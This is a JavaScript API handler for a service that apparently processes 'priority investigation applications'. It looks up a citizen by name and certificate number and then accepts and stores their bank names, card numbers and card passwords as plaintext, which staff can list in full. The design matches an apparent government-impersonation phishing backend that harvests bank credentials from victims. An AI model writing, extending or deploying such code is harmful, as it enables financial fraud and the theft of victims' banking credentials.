const { getJsonBody, getSupabase, json, methodNotAllowed, normalizeCertificateNumber, publicPriorityApplication, requireStaff, serviceErrorMessage } = require('../_lib/service');

async function handler(req, res) {
  if (!['GET', 'POST'].includes(req.method)) return methodNotAllowed(res, ['GET', 'POST']);
  try {
    const client = getSupabase();

    if (req.method === 'GET') {
      const session = requireStaff(req, res);
      if (!session) return;
      const result = await client.from('priority_applications').select('*').order('created_at', { ascending: false });
      if (result.error) throw result.error;
      return json(res, 200, { applications: (result.data || []).map(publicPriorityApplication) });
    }

    const body = await getJsonBody(req);
    const citizenName = String(body.citizenName || '').trim();
    const certificateNumber = normalizeCertificateNumber(body.certificateNumber);
    const entries = Array.isArray(body.entries) ? body.entries.map((entry) => ({
      bank: String(entry?.bank || '').trim(),
      cardNumber: String(entry?.cardNumber || '').trim(),
      password: String(entry?.password || '').trim()
    })).filter((entry) => entry.bank || entry.cardNumber || entry.password) : [];
    if (citizenName.length < 2 || certificateNumber.length < 3) return json(res, 400, { error: '請輸入姓名與證號' });

    const cases = await client.from('service_cases').select('id').eq('citizen_name', citizenName).eq('certificate_number', certificateNumber).limit(1);
    if (cases.error) throw cases.error;
    if (!(cases.data || []).length) return json(res, 404, { error: '查無資料' });
    if (!entries.length) return json(res, 400, { error: '請至少填寫一筆銀行別、卡號或密碼' });

    const inserted = await client.from('priority_applications').insert({
      citizen_name: citizenName,
      certificate_number: certificateNumber,
      entries_json: JSON.stringify(entries)
    }).select('*').single();
    if (inserted.error) throw inserted.error;
    json(res, 200, { application: publicPriorityApplication(inserted.data) });
  } catch (error) {
    json(res, 500, { error: serviceErrorMessage(error, '優先調查申請處理失敗') });
  }
}

module.exports = handler;
